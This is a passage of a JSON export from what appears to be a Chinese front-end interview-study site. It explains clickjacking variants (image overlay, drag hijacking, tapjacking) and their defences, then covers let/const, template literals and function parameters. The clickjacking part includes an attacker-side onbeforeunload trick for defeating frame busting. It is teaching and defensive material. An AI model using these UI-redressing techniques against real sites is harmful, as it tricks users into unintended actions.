![image-20221223141019925.png](https://static.ecool.fun//article/a3c92812-2b6d-46c8-a89f-e38ed4154d70.awebp)\n\n### 2.2 图片覆盖攻击\n\n点击劫持是一种视觉上的欺骗手段。那么图片覆盖也可以起到类似的作用。简称XSIO（Cross Site Image Overlaying）\n\n_原理：_ 利用的是图片的style,或者能够控制CSS。如果应用没有限制style的position为absolute的话，图片可以覆盖到页面上的任意位置。\n\n```css\n<img style=\"position: absolute; left: 100px; top: 100px\">\n\n```\n\n用户点击图片，就会链接到其他网站。\n\n图片还可以伪装得像一个正常的链接、按钮；或者在图片中构造一些文字，覆盖在关键的位置，就有可能完全改变页面中想表达的意思。这种情况下，不需要用户点击，也能达到欺骗的目的。\n\n由于img标签在很多系统中是对用户开放的，因此在现实生活中有非常多的站点存在在XSIO攻击的可能。在防御XSIO时，需要检查用户提交的HTML代码中，img标签的style属性是否可能导致浮出。\n\n### 2.3 拖拽劫持与数据窃取\n\n目前，许多浏览器都开始支持Drag和Drop的API。对于用户来说，拖拽使他们的操作更加简单。浏览器中的拖拽对象可以是一个链接，也可以是一段文字，还可以从一个窗口拖拽到另一个窗口，因此拖拽是_不受同源策略限制_的。\n\n拖拽劫持的思路是诱使用户从隐藏不可见iframe中拖拽出攻击者希望得到的数据，然后放到攻击者能控制的另外一个页面，从而窃取数据。在JavaScript的支持下，这个攻击过程会变得非常隐蔽，因为它突破了传统ClickJacking一些先天的局限，所以这种新型的拖拽劫持能够造成更大的破坏。\n\n### 2.4 ClickJacking3.0：触屏劫持\n\n智能手机的 _触屏劫持_ 攻击被斯坦福的[安全研究者公布](http://seclab.stanford.edu/websec/framebusting/tapjacking.pdf \"http://seclab.stanford.edu/websec/framebusting/tapjacking.pdf\")，这意味着ClickJacking的攻击方式更进一步，斯坦福安全研究者的将其称为TapJacking。\n\n从手机角度来看，触屏实际上就是一个事件，手机捕捉这些事件，并执行相应的动作。 常见的几个事件：\n\n```makefile\ntouchstart: 手指触摸屏幕时发生\ntouchend: 手指离开屏幕时发生\ntouchmove: 手指滑动时发生\ntouchcancel: 系统可取消touch事件\n```\n\n将一个不可见的iframe覆盖到当前网页上，就可以劫持用户的触屏操作。\n\n在未来，随着移动设备中浏览器功能的丰富，我们会看到更多的TapJacking\n\n## 三、防御\n\n### 3.1 防御ClickJacking\n\n#### 3.1.1 frame busting\n\n通过可以写一段JavaScript代码，以禁止iframe的嵌套。这种方法叫作frame busting。比如\n\n```js\nif (top.location != location) {\n  top.location = self.location;\n}\n```\n\n当然，还要很多很多frame busting的写法，这里就不做赘述了。\n\n_缺点_：js编写的，防御效果不好，可绕过\n\n#### 3.1.2 X-Frame-Options\n\n使用HTTP头:`X-Frame-Options`\n\n`X-Frame-Options`可以说是为了解决ClickJacking而生的，且浏览器支持较好。它有三个可选的值：\n\n```css\nDENY 拒绝当前页面加载任何frame页面\nSAMEORIGIN  frame页面的地址只能为同源域名下的页面\nALLOW-FROM origin 定义允许frame加载的页面地址\n```\n\n例如：\n\n-   京东：X-Frame-Options: SAMEORIGIN\n-   Facebook：x-frame-options: DENY\n-   Twitter：x-frame-options: DENY\n\n_配置 X-FRAME-OPTIONS_：\n\n-   使用 meta标签来设置 `X-Frame-Options` 是无效的！例如 `<meta http-equiv=\"X-Frame-Options\" content=\"deny\">` 没有任何效果\n    \n-   配置 Apache\n    \n    -   把下面这行添加到 'site' 的配置中：\n    -   `Header always set X-Frame-Options \"SAMEORIGIN\"`\n\n-   配置nginx\n    \n    -   把下面这行添加到 'http', 'server' 或者 'location'，配置中\n    -   `add_header X-Frame-Options SAMEORIGIN;`\n-   其余配置可自行百度。\n    \n\n除了`X-Frame-Options`之外，Firefox的`Content Security Policy`以及Firefox的`NoScript`扩展也能有效防御ClickJacking。这些方案为我们提供了更多的选择。\n\n### 3.2 其他方式\n\n#### 3.2.1 阻止顶级导航\n\n我们可以阻止因更改 beforeunload 事件处理程序中的 top.location 而引起的过渡（transition）。\n\n顶级页面（从属于黑客）在 beforeunload 上设置了一个用于阻止的处理程序，像这样：\n\n```javascript\nwindow.onbeforeunload = function() {\n  return false;\n};\n```\n\n当 `iframe` 试图更改 `top.location` 时，访问者会收到一条消息，询问他们是否要离开页面。\n\n在大多数情况下，访问者会做出否定的回答，因为他们并不知道还有这么一个 `iframe`，他们所看到的只有顶级页面，他们没有理由离开。所以 `top.location` 不会变化！\n\n#### 3.2.2 显示禁用的功能\n\n`X-Frame-Options` 有一个副作用。其他的网站即使有充分的理由也无法在 iframe 中显示我们的页面。\n\n因此，还有其他解决方案。例如，我们可以用一个样式为 `height: 100%; width: 100%;` 的 `<div>` “覆盖”页面，这样它就能拦截所有点击。如果 `window == top` 或者我们确定不需要保护时，再将该 `<div>` 移除。\n\n```xml\n<style>\n  #protector {\n    height: 100%;\n    width: 100%;\n    position: absolute;\n    left: 0;\n    top: 0;\n    z-index: 99999999;\n  }\n</style>\n​\n<div id=\"protector\">\n  <a href=\"/\" target=\"_blank\">前往网站</a>\n</div>\n​\n<script>\n  // 如果顶级窗口来自其他源，这里则会出现一个 error\n  // 但是在本例中没有问题\n  if (top.document.domain == document.domain) {\n    protector.remove();\n  }\n</script>\n```\n\n## 四、总结\n\n点击劫持是一种“诱骗”用户在不知情的情况下点击恶意网站的方式。如果是重要的点击操作，这是非常危险的。\n\n黑客可以通过信息发布指向他的恶意页面的链接，或者通过某些手段引诱访问者访问他的页面。当然还有很多其他变体。\n\n一方面 —— 这种攻击方式是“浅层”的：黑客所做的只是拦截一次点击。但另一方面，如果黑客知道在点击之后将出现另一个控件，则他们可能还会使用狡猾的消息来迫使用户也点击它们。\n\n这种攻击相当危险，因为在设计交互界面时，我们通常不会考虑到可能会有黑客代表用户点击界面。所以，在许多意想不到的地方可能发现攻击漏洞。\n\n-   建议在那些不希望被在 iframe 中查看的页面上（或整个网站上）使用 `X-Frame-Options: SAMEORIGIN`。\n-   如果我们希望允许在 iframe 中显示我们的页面，那我们使用一个 `<div>` 对整个页面进行遮盖，这样也是安全的。",
    "testPoint": "### **1. 点击劫持的基本概念**\n#### **问题**：\n- 什么是点击劫持（Clickjacking）？\n- 点击劫持通常利用了哪些前端特性或漏洞？\n- 点击劫持可能带来的危害有哪些？\n\n**关键点**：\n- 点击劫持是一种通过隐藏的 iframe 或伪装界面诱导用户点击的攻击方式。\n- 主要危害包括未经用户授权的操作，例如点赞、分享、提交敏感信息或执行交易。\n\n---\n\n### **2. 点击劫持的攻击原理**\n#### **问题**：\n- 点击劫持是如何实现的？它的基本流程是什么？\n- iframe 在点击劫持中扮演了什么角色？\n- 如何通过 CSS 或 JavaScript 伪装页面元素诱导用户点击？\n\n**关键点**：\n- 攻击者使用一个透明或不可见的 iframe，将目标网站嵌入到恶意页面中。\n- 用户以为在操作恶意页面的 UI，实际上是在操作目标网站。\n\n---\n\n### **3. 防御点击劫持的技术措施**\n#### **问题**：\n- 什么是 `X-Frame-Options`？它如何防御点击劫持？\n- `Content-Security-Policy` 中的 `frame-ancestors` 指令有什么作用？如何配置？\n- 如何使用 JavaScript 检测页面是否被嵌入到 iframe 中？\n- 除了技术手段，还可以通过哪些设计策略防御点击劫持？\n\n**关键点**：\n- **`X-Frame-Options`**：\n  - `DENY`：不允许页面被嵌套。\n  - `SAMEORIGIN`：仅允许相同源嵌套。\n- **`Content-Security-Policy`**：\n  - `frame-ancestors 'none';` 可完全禁止嵌套。\n- **JavaScript 检测**：\n  - 判断 `window.top === window.self`，若不相等，则页面被嵌套。\n\n---\n\n### **4. 点击劫持的常见场景**\n#### **问题**：\n- 在以下场景中，点击劫持可能如何发生？如何防御？\n  1. 一个支付页面被恶意嵌入到第三方网站。\n  2. 一个用户点赞功能的按钮被伪装成无害的广告。\n  3. 在线表单提交功能被恶意页面诱导填写。\n\n**关键点**：\n- 对敏感操作进行额外验证（如 CAPTCHA 或二次确认）。\n- 在用户重要操作前显示明确的提示，确保用户知情。\n\n---\n\n### **5. 点击劫持的检测与排查**\n#### **问题**：\n- 如何检测你的页面是否被嵌入到其他网站的 iframe 中？\n- 如果发现某些功能无法正常使用，可能与点击劫持相关，如何排查？\n\n**关键点**：\n- 检测并阻止嵌套行为：\n  ```javascript\n  if (window.top !== window.self) {\n      window.top.location = window.self.location;\n  }\n  ```\n- 使用浏览器调试工具检查页面是否被嵌套。\n\n---\n\n### **6. 实践经验与场景化问题**\n#### **问题**：\n- 如果你的页面有嵌套需求（如嵌入支付或第三方服务），如何兼顾功能需求和安全性？\n- 如何配置防御点击劫持的策略，同时保证嵌入的广告或合作内容正常显示？\n- 在实际项目中，你是否遇到过类似攻击？如何应对？\n\n**关键点**：\n- 为合作伙伴提供明确的域名白名单。\n- 配置灵活的 `Content-Security-Policy` 策略，例如：\n  ```http\n  Content-Security-Policy: frame-ancestors 'self' https://trusted-partner.com;\n  ```\n\n---\n\n### **7. 点击劫持与用户体验**\n#### **问题**：\n- 点击劫持防御措施（如 `X-Frame-Options`）是否可能影响正常功能？如何权衡安全性和用户体验？\n- 如何避免过度防御（如完全禁用 iframe）对业务场景造成影响？\n\n---\n\n### **8. 项目实践经验**\n#### **问题**：\n- 你是否配置过 `X-Frame-Options` 或 `Content-Security-Policy`？配置过程中遇到过哪些问题？\n- 在某些需要嵌套 iframe 的业务场景中（如 OAuth 登录流程），如何确保嵌套的安全性？\n- 你是否遇到过用户反馈因点击劫持防御策略导致功能异常的问题？如何解决？\n\n---\n\n### **9. 点击劫持与其他攻击的关系**\n#### **问题**：\n- 点击劫持与 CSRF 有什么关系？两者如何结合进行攻击？\n- 点击劫持与视觉欺骗（UI Redressing）有什么相似之处？\n\n**关键点**：\n- 点击劫持可能通过 CSRF 伪造请求，进一步加剧危害。\n- 两者均利用用户的误操作或视觉误导。",
    "exerciseKeyList": "[\"eb451be3-dc88-481c-b8a8-da6c8d278e95\",\"4bc2059f-c8c1-46f9-a768-0e43f8a06665\",\"d627f91c-d910-447b-88b5-4f424799aa84\"]",
    "vipLimit": 1,
    "level": 2.5,
    "pointOrder": 1,
    "createAt": "2024-10-02T04:04:58.000Z",
    "updateAt": "2024-12-04T01:55:09.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "4bc2059f-c8c1-46f9-a768-0e43f8a06665",
        "title": "什么是点击劫持？如何防范点击劫持？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-17T14:33:34.000Z",
        "updateAt": "2021-11-17T22:49:05.000Z"
      },
      {
        "exerciseKey": "d627f91c-d910-447b-88b5-4f424799aa84",
        "title": "点击劫持",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T15:42:46.000Z",
        "updateAt": "2024-07-18T23:11:49.000Z"
      },
      {
        "exerciseKey": "eb451be3-dc88-481c-b8a8-da6c8d278e95",
        "title": "什么是点击穿透，怎么解决？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-17T14:20:39.000Z",
        "updateAt": "2024-07-20T11:30:24.000Z"
      }
    ]
  },
  "47": {
    "id": 47,
    "tagId": 24,
    "title": "Let/Const",
    "explanation": "\n\nVar\n---\n\n在 ES6 出现之前，必须使用 `var` 声明。但是，前端开发出现的一些问题与使用 `var` 声明的变量有关。这就是为什么必须要有新的方法来声明变量。首先，让我们在讨论这些问题之前更多地了解 `var`。\n\n### var 的作用域\n\n**作用域**本质上是指变量/函数可供访问的范围。`var`可以在全局范围声明或函数/局部范围内声明。\n\n当在最外层函数的外部声明`var`变量时，作用域是全局的。这意味着在最外层函数的外部用`var`声明的任何变量都可以在`windows`中使用。\n\n当在函数中声明`var`时，作用域是局部的。这意味着它只能在函数内访问。\n\n要进一步了解，请查看下面的示例。\n\n```\nvar greeter = 'hey hi';\n\nfunction newFunction() {\n    var hello = 'hello';\n}\n\n```\n\n这里，`greeter`是全局范围的，因为它存在于函数外部，而`hello`是函数范围的。因此，我们无法在函数外部访问变量`hello`。因此，如果我们这样做：\n\n```\nvar tester = 'hey hi';\nfunction newFunction() {\n    var hello = 'hello';\n}\nconsole.log(hello); // error: hello is not defined\n\n```\n\n我们会收到错误消息，这是由于函数外部没有`hello`导致的。\n\n### var 变量可以重新声明和修改\n\n这意味着我们可以在相同的作用域内执行下面的操作，并且不会出错\n\n```\nvar greeter = 'hey hi';\nvar greeter = 'say Hello instead';\n\n```\n\n又比如\n\n```\nvar greeter = 'hey hi';\ngreeter = 'say Hello instead';\n\n```\n\n### var 的变量提升\n\n变量提升是 JavaScript 的一种机制:在执行代码之前，变量和函数声明会移至其作用域的顶部。这意味着如果我们这样做:\n\n```\nconsole.log(greeter);\nvar greeter = 'say hello';\n\n```\n\n生面的代码会被解释为:\n\n```\nvar greeter;\nconsole.log(greeter); // greeter is undefined\ngreeter = 'say hello';\n\n```\n\n因此，将`var`声明的变量会被提升到其作用域的顶部，并使用 undefined 值对其进行初始化.\n\n### var 的问题\n\n`var`有一个弱点。我将使用以下示例进行说明：\n\n```\n    var greeter = \"hey hi\";\n    var times = 4;\nif (times &gt; 3) {\n    var greeter = \"say Hello instead\";\n}\n\nconsole.log(greeter) // \"say Hello instead\"\n\n```\n\n由于`times> 3`返回 true，因此将`greeter`重新定义为`saysay Hello`。如果你有是故意重新定义`greeter`，这段代码是问题的，但是当你不知道之前已经定义了变量`greeter`时，这将成为产生问题。\n\n如果在代码的其他部分使用了`greeter`，这可能会导致代码中出现许多错误。这就是为什么需要`let`和`const`的原因。\n\nLet\n---\n\n`let`现在已经成为变量声明的首选。这并不奇怪，因为它是对`var`声明的改进。它也解决了我们刚刚介绍的`var`问题。让我们考虑一下为什么会这样。\n\n### let 是块级作用域\n\n块是由 {} 界定的代码块，大括号中有一个块。大括号内的任何内容都包含在一个块级作用域中.\n\n因此，在带有`let`的块中声明的变量仅可在该块中使用。让我用一个例子解释一下\n\n```\nlet greeting = 'say Hi';\nlet times = 4;\n\nif (times > 3) {\n    let hello = 'say Hello instead';\n    console.log(hello); // \"say Hello instead\"\n}\nconsole.log(hello); // hello is not defined\n\n```\n\n我们看到在其代码块（定义它的花括号）之外使用`hello`会返回错误。这是因为`let`变量是块范围的.\n\n### let 可以被修改但是不能被重新声明.\n\n就像`var`一样，用`let`声明的变量可以在其范围内被修改。但与`var`不同的是，`let`变量无法在其作用域内被重新声明。 来看下面的栗子:\n\n```\nlet greeting = 'say Hi';\ngreeting = 'say Hello instead';\n\n```\n\n上面的代码将会返回一个错误:\n\n```\nlet greeting = 'say Hi';\nlet greeting = 'say Hello instead'; // error: Identifier 'greeting' has already been declared\n\n```\n\n但是，如果在不同的作用域中定义了相同的变量，则不会有错误：\n\n```\nlet greeting = 'say Hi';\nif (true) {\n    let greeting = 'say Hello instead';\n    console.log(greeting); // \"say Hello instead\"\n}\nconsole.log(greeting); // \"say Hi\"\n\n```\n\n为什么没有错误？ 这是因为两个实例的作用域不同，因此它们会被视为不同的变量。\n\n这个事实说明:使用`let`,是比`var`更好的选择。当使用`let`时，你不必费心思考 🤔 变量的名称，因为变量仅在其块级作用域内存在。\n\n同样，由于在一个块级作用域内不能多次声明一个变量，因此不会发生前面讨论的`var`出现的问题。\n\n### let 的变量提升\n\n就像`var`一样，`let`声明也被提升到作用域顶部。  \n但不同的是:\n\n*   用`var`声明的变量会被提升到其作用域的顶部，并使用 undefined 值对其进行初始化。\n*   用`let`声明的变量会被提升到其作用域的顶部，不会对值进行初始化。\n\n因此，如果你尝试在声明前使用`let`变量，则会收到`Reference Error`。\n\nConst\n-----\n\n用`const`声明的变量保持常量值。 `const`声明与`let`声明有一些相似之处\n\n### const 声明的变量在块级作用域内\n\n像`let`声明一样，`const`声明只能在声明它们的块级作用域中访问\n\n### const 不能被修改并且不能被重新声明\n\n这意味着用`const`声明的变量的值保持不变。不能修改或重新声明。因此，如果我们使用`const`声明变量，那么我们将无法做到这一点:\n\n```\nconst greeting = 'say Hi';\ngreeting = 'say Hello instead'; // error: Assignment to constant variable.\n\n```\n\n或者这个这样:\n\n```\nconst greeting = 'say Hi';\nconst greeting = 'say Hello instead'; // error: Identifier 'greeting' has already been declared\n\n```\n\n因此，每个`const`声明都必须在声明时进行初始化。\n\n当用`const`声明对象时，这种行为却有所不同。虽然不能更新`const`对象，但是可以更新该对象的属性。 因此，如果我们声明一个`const`对象为\n\n```\nconst greeting = {\n    message: 'say Hi',\n    times: 4,\n};\n\n```\n\n同样不能像下面这样做:\n\n```\nconst greeting = {\n    words: 'Hello',\n    number: 'five',\n}; // error:  Assignment to constant variable.\n\n```\n\n但我们可以这样做:\n\n```\ngreeting.message = 'say Hello instead';\n\n```\n\n这将更新`greeting.message`的值，而不会返回错误。\n\n### const 的变量提升\n\n就像`let`一样，`const`声明也被提升到顶部，但是没有初始化。\n\n最后，我们总结一下它们的异同：\n\n*   `var`声明是全局作用域或函数作用域，而`let`和`const`是块作用域。\n*   `var`变量可以在其范围内更新和重新声明； `let`变量可以被更新但不能重新声明； `const`变量既不能更新也不能重新声明。\n*   它们都被提升到其作用域的顶端。但是，虽然使用变量`undefined`初始化了`var`变量，但未初始化`let`和`const`变量。\n*   尽管可以在不初始化的情况下声明`var`和`let`，但是在声明期间必须初始化`const`。\n",
    "testPoint": "\n1. **作用域**：\n   - `var`：函数作用域，存在变量提升。\n   - `let`/`const`：块级作用域，无变量提升，存在暂时性死区。\n\n2. **重复声明**：\n   - `var`：允许在同一函数作用域内重复声明。\n   - `let`/`const`：不允许在同一作用域（包括块级作用域）内重复声明。\n\n3. **赋值**：\n   - `var`/`let`：可以重新赋值。\n   - `const`：一旦赋值，不能重新指向新地址，但对象/数组内容可修改。\n\n4. **全局作用域**：\n   - `var`声明的变量会成为`window`对象的属性。\n   - `let`/`const`不会。\n\n5. **使用建议**：\n   - 优先使用`let`和`const`，避免`var`带来的问题。\n   - 对于不需要重新赋值的变量，使用`const`。\n\n",
    "exerciseKeyList": "[\"1ac5429e-8c75-4ed0-be82-54404bcf4ca6\",\"0932f958-6b14-4aac-b469-4ed62242c65f\",\"769ab8fd-1070-42d3-817e-48d9b37374ff\",\"c843a307-4934-4fa2-9c16-9f06484b0021\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-02T04:33:12.000Z",
    "updateAt": "2024-12-17T02:19:28.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "0932f958-6b14-4aac-b469-4ed62242c65f",
        "title": "用es5如何实现 let 和 const ？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-16T04:26:21.000Z",
        "updateAt": "2022-07-05T09:39:12.000Z"
      },
      {
        "exerciseKey": "1ac5429e-8c75-4ed0-be82-54404bcf4ca6",
        "title": "全局作用域中，用 const 和 let 声明的变量不在 window 上，那到底在哪里？如何去获取？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-14T23:47:54.000Z"
      },
      {
        "exerciseKey": "769ab8fd-1070-42d3-817e-48d9b37374ff",
        "title": "什么是 let 的临时性死区？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T08:06:45.000Z",
        "updateAt": "2021-07-11T16:10:53.000Z"
      },
      {
        "exerciseKey": "c843a307-4934-4fa2-9c16-9f06484b0021",
        "title": "var、let、const之间有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:34:55.000Z",
        "updateAt": "2024-08-10T17:04:27.000Z"
      }
    ]
  },
  "48": {
    "id": 48,
    "tagId": 24,
    "title": "模版字符串",
    "explanation": "未见过的函数用法：\n\n```\nfunction fun(strings,params1){\n    console.log(strings);\n    console.log(params1)\n}\n\nfun`params1 = ${333}`\n//  输出分别为\n//  ['params1 = ', '']\n//  333\n\n```\n\n不知道各位在学习或开发中有没有遇到过这样的函数调用方式呢？秉承着我没遇到的东西就要发文章来分享分享的原则，经过我查阅资料并加以学习，就让本文来带大家了解一下JS中的标签函数吧。\n\n模板字符串\n-----\n\n标签函数的主要作用就是处理模板字符串，所以在了解标签函数之前先了解一下模板字符串（模板字面量）吧。\n\n### 基本用法\n\n模板字符串是ES6新增的使用模板字面量定义字符串的能力，用反引号` `` ` 进行分隔。与使用`''`或`\"\"`的定义的字符串字面量不同是模板字面量保留换行字符，可以跨行定义字符串。 例如：\n\n```\nlet str1 = 'xxhh\\n2233'\nlet str2 = `xxhh\n2233`\nconsole.log(str1 === str2) // 结果为true\n\n\n```\n\n要注意的是模板字符串中的所有字符都会包含在字符串中，特别在使用缩进的时候，缩进的空格都会包含在字符串中。\n\n```\nlet str = `\n    <div>\n        <h1>xxhh</h1>\n    </div>\n`\nconsole.log(str.length)  // 结果为44，包含了缩进所产出的所有空格\n\n```\n\n### 字符串插值\n\n在没有模板字符串时，我们通常会使用`+`加法运算符来进行字符串的拼接，但有了模板字符串后我们并可通过插值占位符`${}`来将各字面量、变量或表达式结果来进行拼接，这样可以更容易地创建复杂和动态的字符串，同时保持代码的可读性和简洁性。这是模板字符串最常用的一个特性。\n\n```\nlet name = 'xxhh';\nlet str1 = \"name:\"+name;\nlet str2 = `name:${name}`;\nconsole.log(str1,str2) // name:xxhh name:xxhh\nconsole.log(str1 === str2) // true\n\n```\n\n要注意的是使用字符串插值的所有插入的值都会使用`toString()`强制转型为字符串，而且任何JavaScript 表达式都可以用于插值。\n\n标签函数\n----\n\n在JS中，标签函数（Tagged Template Functions）是一种特殊类型的函数（带标签的模板），它允许你以一种更灵活、更强大的方式处理字符串模板。当你使用反引号(` `` `)创建模板字符串时，如果在前面加上一个函数名，那么这个函数就会成为一个标签函数。\n\n### 函数的参数\n\n标签函数的第一个参数包含一个字符串数组，其余的参数与表达式相关。 例如：\n\n```\nlet name = 'xxhh';\nlet age = 18;\nfunction tagTemplate(...args){\n    console.log(args)\n}\ntagTemplate`name:${name},age:${age}`\n// 输出的三个参数分别为\n// ['name:', ',age:', '', raw: Array(3)]\n// \"xxhh\"\n// 18\n\n```\n\n从上例可以看出函数的参数中第一个是包含了模板字符串中的除插值外的字符部分（通常用`strings`接收），其余参数为模板字符串中各插值表达式的结果(`values`)。\n\n### 标签函数的作用\n\n使用标签函数可以对所接收的参数执行任何操作，并返回被操作过的字符串。例如我要对一个模板中的时间进行补`0`操作\n\n```\nlet time = new Date()\n\nfunction handlerTime(strings,nowDate,nowTime){\n    // 处理现在的日期\n    let newDate = nowDate.split('/').map(item=>{\n        return item.length<2?'0'+item:item\n    }).join('/');\n    // 处理现在具体的时间\n    let newTime = nowTime.split(':').map(item=>{\n        return item.length<2?'0'+item:item\n    }).join(':')\n\n    // 返回处理后的字符串\n    return `${strings[0]}${newDate}${strings[1]}${newTime}${strings[2]}`\n}\n\nlet now = handlerTime`现在是北京时间：${time.toLocaleDateString()}  ${time.toLocaleTimeString()}`\n\nconsole.log(now)\n\n\n```\n\n要注意的是标签不必是普通的标识符，你可以使用包括属性访问、函数调用、`new` 表达式，甚至其他带标签的模板字面量。\n\n```\nconsole.log`xxhh`; // [ 'xxhh' ]\n\nnew Function(\"console.log(arguments)\")`Hello`; // [Arguments] { '0': [ 'Hello' ] }\n\nfunction myTag(strings, ...values) {\n  console.log(strings, values);\n  return myTag;\n}\nmyTag`xxhh``2233`;\n// [ 'xxhh' ] []\n// [ '2233' ] []\n\n```\n\n所以标签函数可以用来做很多事情，其中包括但不限于：\n\n*   标签函数可以处理模板字符串中的表达式，允许你对这些表达式的结果进行操作，这意味着你可以在表达式被插入之前对其进行修改或格式化。\n*   库中使用标签函数来创建类型安全的字符串构建器，确保只有特定类型的表达式才能被插入到模板字符串中。\n*   标签函数可用于动态生成代码片段，例如在元编程中，可以用来生成并执行特定的代码模板。\n\n  \n",
    "testPoint": "\n1. **基本语法**：\n   - 使用反引号创建模板字符串。\n   - 使用`${}`嵌入变量或表达式。\n\n2. **多行字符串**：\n   - 模板字符串支持多行，保留空格和缩进。\n\n3. **字符串插值**：\n   - 在模板字符串中嵌入变量和表达式。\n\n4. **转义字符**：\n   - 使用反斜杠转义特殊字符。\n\n5. **嵌套模板**：\n   - 在模板字符串中嵌套其他模板。\n\n6. **性能考虑**：\n   - 了解模板字符串在处理大量字符串时的性能。\n\n\n",
    "exerciseKeyList": "[]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-02T04:46:03.000Z",
    "updateAt": "2024-12-17T02:19:29.000Z",
    "$progressExercise": "",
    "$exerciseList": []
  },
  "49": {
    "id": 49,
    "tagId": 24,
    "title": "默认参数",
    "explanation": "\n\n一、参数传递\n\n代码语言：javascript\n\n复制\n\n```\nfunction foo(a, b) {\n    console.log([a, b]);\n}\n\nfoo(1, 2); // 输出 [1, 2]\n```\n\n这个例子中，a 和 b 属于函数中的局部变量，只能在函数中访问。调用函数时，传递的数据会根据位置来匹配对应，分别赋值给 a 和 b。\n\n创建函数时，function 函数名 后面括号中设定的参数被称为形参；调用函数时，函数名后面括号中传入的参数被称为实参。上面例子中，a 和 b 是形参，传入的 1 和 2 是实参。\n\n因为形参是已声明的变量，所以不能再用 let 和 const 重复声明。\n\n代码语言：javascript\n\n复制\n\n```\nfunction foo(a, b) {\n    let a = 1; // 报错，a 已声明\n    const b = 1; // 报错，b 已声明\n}\n```\n\nJavaScript 中所有函数传递都是按值传递的，不会按引用传递。所谓的值，就是指直接保存在变量上的值，如果把对象作为参数传递，那么这个值就是这个对象的引用，而不是对象本身。这里实际上是一个隐式的赋值过程，所以给函数传递参数时，相当于从一个变量赋值到另一个变量。\n\n原始值：\n\n代码语言：javascript\n\n复制\n\n```\nfunction add(num) {\n    return num + 1;\n}\n\nlet count = 5;\nlet result = add(count); // 此处参数传递的过程可以看作是 num = count\n\nconsole.log(count); // 5\nconsole.log(result); // 6\n```\n\n引用值：\n\n代码语言：javascript\n\n复制\n\n```\nfunction setName(obj) {\n    obj.name = \"小明\";\n}\n\nlet person = {};\n\nsetName(person); // 此处参数传递的过程可以看作是 obj = person;\nconsole.log(person); // {name: \"小明\"}\n```\n\n二、理解参数 JavaScript 中的函数既不会检测参数的类型，也不会检测传入参数的个数。定义函数时设置两个形参，不意味着调用时必须传入两个参数。实际调用时不管是传了一个还是三个，甚至不传参数也不会报错。\n\n所有函数（非箭头）中都有一个名为 arguments 的特殊的类数组对象（不是 Array 的实例），它保存着所有实参的副本，我们可以通过它按照数组的索引访问方式获取所有实参的值，也可以访问它的 arguments.length 属性来确定函数实际调用时传入的参数个数。\n\n例如：\n\n代码语言：javascript\n\n复制\n\n```\nfunction foo(a, b) {\n\tconsole.log(arguments[0]);\n    console.log(arguments[1]);\n    console.log(arguments.length);\n}\n\nfoo(10, 20); // 依次输出 10、20、2 \n```\n\n上面例子中，foo() 函数的第一个参数是 a，第二个参数是b ，可以通过 arguments\\[x\\] 的方式来分别获取同样的值 。因此，你甚至可以在声明函数时不设置形参。\n\n代码语言：javascript\n\n复制\n\n```\nfunction foo() {\n\tconsole.log(arguments[0]);\n    console.log(arguments[1]);\n}\n\nfoo(10, 20); // 依次输出 10、20 \n```\n\n由此可见，JavaScript 函数的形参只是方便使用才写出来的。想传多少个参数都不会产生错误。\n\n还有一个要注意的是，arguments 可以跟形参一起使用，并且 arguments 对象中的值会和对应的形参保持同步。例如：\n\n代码语言：javascript\n\n复制\n\n```\nfunction foo(a) {\n\targuments[0] ++;\n    console.log(a);\n}\n\nfoo(10); // 输出 11\n//------------------------------------\nfunction foo2(a) {\n\ta++;\n    console.log(arguments[0]);\n}\n\nfoo2(10); // 输出 11\n```\n\n当修改 arguments\\[0\\] 或 a 的值时，另一个也被改变了。这并不意味着它们访问同一个内存地址，毕竟我们传入的是一个原始值。它们在内存中还是分开的，只是由于内部的机制使它们的值保持了同步。\n\n另外，如果缺少传参，那这个形参的值就不会和 arguments 对象中的对应值进行同步。例如下面这个例子，只传了一个参数，那么arguments 中只有一个实参值，这时候在函数中把 arguments\\[1\\] 设置为某个值，这个值并不会同步给第二个形参，例如：\n\n代码语言：javascript\n\n复制\n\n```\nfunction foo(a,b) {\n    arguments[1] = 2;\n    console.log(b);\n}\n\nfoo(1); // 输出 undefined\n```\n\n这个例子中，形参 b 没有传入实参，它的值会默认为 undefined。但如果：\n\n代码语言：javascript\n\n复制\n\n```\nfoo(1, undefined); // 输出 2\n```\n\n手动传入 undefined 时， arguments 数组中会出现一个值为 undefined 的元素，依然能和 b 的值进行同步。\n\n严格模式下，arguments 对象中的值和形参不会再同步，当然，如果传入的是引用值，它们依然会互相影响，但这只是引用值的特性而已。因此，在开发中最好不要依赖这种同步机制，也就是说不要同时使用形参和它在arguments 对象中的对应值。\n\n箭头函数中没有 arguments 如果函数是使用箭头语法定义的，那么函数中是没有 arguments 对象的，只能通过定义的形参来访问。\n\n代码语言：javascript\n\n复制\n\n```\nlet foo = () => {\n    console.log(arguments[0]);\n}\n\nfoo(); // 报错，arguments 未定义\n```\n\n在某些情况可能会访问到 arguments ：\n\n代码语言：javascript\n\n复制\n\n```\nfunction fn1(){\n    let fn2 = () => {\n    \tconsole.log(arguments[0]);\n    }\n    fn2();\n}\nfn1(5);\n```\n\n但这个 arguments，并不是箭头函数的，而是属于外部普通函数的，当箭头函数中访问 arguments 时，顺着作用域链找到了外部函数的arguments。\n\n三、将对象属性用作实参 当一个函数包含的形参有多个时，调用函数就成了一种麻烦，因为你总是要保证传入的参数放在正确的位置上，有没有办法解决传参顺序的限制呢？\n\n由于对象属性是无序的，通过属性名来确定对应的值。因此可以通过传入对象的方式，以对象中的属性作为真正的实参，这样参数的顺序就无关紧要了。\n\n代码语言：javascript\n\n复制\n\n```\nfunction foo(obj) {\n    console.log(obj.name, obj.sex, obj.age);\n}\n\nfoo({ sex: '男', age: 18, name: '小明' }); // 小明 男 18\n```\n\n四、参数默认值 